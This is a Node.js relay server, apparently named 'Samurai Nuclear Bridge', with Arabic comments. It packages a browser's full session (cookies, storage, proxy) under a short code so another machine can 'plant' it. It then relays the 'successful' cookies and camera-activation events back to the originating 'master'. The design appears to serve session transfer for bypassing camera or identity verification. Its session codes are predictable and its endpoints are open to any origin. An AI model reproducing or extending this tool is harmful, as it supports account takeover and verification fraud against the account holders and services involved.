const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');

const app = express();

// السماح بطلبات من جميع النطاقات (CORS)
app.use(cors());

// 🔥 مهم جداً: زيادة الحد الأقصى لحجم البيانات لأن الجلسة الكاملة (Storage + Cookies) قد تكون كبيرة
app.use(express.json({ limit: '50mb' }));

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// خريطة لتخزين اتصالات الماستر النشطة (session_id -> WebSocket)
const activeMasters = new Map();
// خريطة لتخزين بيانات الجلسات القصيرة في ذاكرة السيرفر (shortCode -> sessionData)
const shortSessions = new Map();

// ==========================================
// 1. قسم الماستر (WebSocket) لتتبع الخطوات والتوجيه العكسي
// ==========================================
wss.on('connection', (ws) => {
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            // عندما يرسل الماستر طلب تسجيل الجلسة باستخدام الكود القصير
            if (data.type === 'REGISTER_MASTER' && data.session_id) {
                activeMasters.set(data.session_id, ws);
                console.log(`[MASTER LINKED] Session ID: ${data.session_id}`);

                // تنظيف الاتصال عند خروج الماستر
                ws.on('close', () => {
                    activeMasters.delete(data.session_id);
                    console.log(`[MASTER DISCONNECTED] Session ID: ${data.session_id}`);
                });
            }
        } catch (err) {
            console.error('WebSocket parsing error:', err);
        }
    });
});

// ==========================================
// 2. نظام الروابط القصيرة وتناقل الجلسة
// ==========================================

// أ: مسار لإنشاء كود قصير وحفظ الجلسة الكاملة القادمة من الماستر
app.post('/create-short-link', (req, res) => {
    const { sessionData } = req.body;
    
    if (!sessionData) {
        return res.status(400).json({ error: "No session data provided" });
    }

    // توليد كود عشوائي من 6 أحرف وأرقام
    const shortCode = Math.random().toString(36).substring(2, 8).toUpperCase();
    
    // حفظ البيانات في السيرفر وربطها بالكود
    shortSessions.set(shortCode, sessionData);
    console.log(`[SESSION PACKAGED] Short Code: ${shortCode} | Proxy Included: ${!!sessionData.proxy}`);

    // تنظيف الذاكرة: حذف الجلسة تلقائياً بعد 15 دقيقة لتفادي استهلاك الذاكرة
    setTimeout(() => {
        shortSessions.delete(shortCode);
        console.log(`[SESSION EXPIRED] Short Code deleted: ${shortCode}`);
    }, 15 * 60 * 1000);

    res.json({ success: true, shortCode: shortCode });
});

// ب: مسار لجلب البيانات باستخدام الكود القصير (يستدعيه العميل لزرع الجلسة)
app.get('/get-session-data/:code', (req, res) => {
    const code = req.params.code;
    const data = shortSessions.get(code);

    if (data) {
        res.json({ success: true, data: data });
    } else {
        res.status(404).json({ success: false, error: "Session expired or invalid" });
    }
});

// ==========================================
// 3. قسم العميل (HTTP POST) لإرسال النتائج العكسية و التتبع
// ==========================================

// أ: مسار الترحيل العكسي - إرسال الكوكيز الناجحة للماستر
app.post('/return-session', (req, res) => {
    const { session_id, final_session } = req.body;
    
    const masterWs = activeMasters.get(session_id);
    if (masterWs && masterWs.readyState === WebSocket.OPEN) {
        // إرسال الكوكيز الجديدة التي تثبت النجاح إلى الماستر
        masterWs.send(JSON.stringify({ 
            type: 'SESSION_RETURNED', 
            final_session: final_session 
        }));
        console.log(`[SUCCESS] Verified Session returned to Master for ID: ${session_id}`);
    } else {
        console.warn(`[WARNING] Master disconnected. Could not return session for ID: ${session_id}`);
    }
    
    res.json({ success: true });
});

// ب: مسار نقل التتبع اللحظي (مثل: الكاميرا اشتغلت)
app.post('/', (req, res) => {
    const { session_id, type, payload, reason } = req.body;

    if (!session_id) {
        return res.status(400).json({ success: false, error: 'Missing session_id' });
    }

    const masterWs = activeMasters.get(session_id);
    const isMasterConnected = masterWs && masterWs.readyState === WebSocket.OPEN;

    // تم الإبقاء عليه احتياطياً لتوافق الأكواد السابقة إن وجدت
    if (payload) {
        try {
            const decodedStr = Buffer.from(payload, 'base64').toString('utf-8');
            const parsedPayload = JSON.parse(decodedStr);
            const uuid = parsedPayload.result;

            if (isMasterConnected) {
                masterWs.send(JSON.stringify({ type: 'UUID_RECEIVED', uuid: uuid }));
            }
            return res.json({ success: true }); 
        } catch (err) {
            console.error('Payload decoding error:', err);
            return res.status(500).json({ success: false, error: 'Invalid payload formatting' });
        }
    }

    // إرسال خطوات التتبع (تفعيل الكاميرا، أخطاء، الخ...)
    if (type) {
        if (isMasterConnected) {
            masterWs.send(JSON.stringify({
                type: type,
                reason: reason || null
            }));
        }
        return res.json({ success: true });
    }

    return res.status(400).json({ success: false, error: 'Invalid request body' });
});

// ==========================================
// 4. مسار الفحص (Health Check)
// ==========================================
app.get('/', (req, res) => {
    res.send(`
        <div style="font-family: monospace; padding: 50px; text-align: center; background: #000; color: #00ff9d; height: 100vh;">
            <h1>SAMURAI NUCLEAR BRIDGE SERVER IS ONLINE 🚀</h1>
            <p>Full Session Replay Architecture is running securely...</p>
        </div>
    `);
});

// ==========================================
// 5. تشغيل السيرفر
// ==========================================
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`[SERVER] Samurai Nuclear Bridge listening on port ${PORT}`);
});
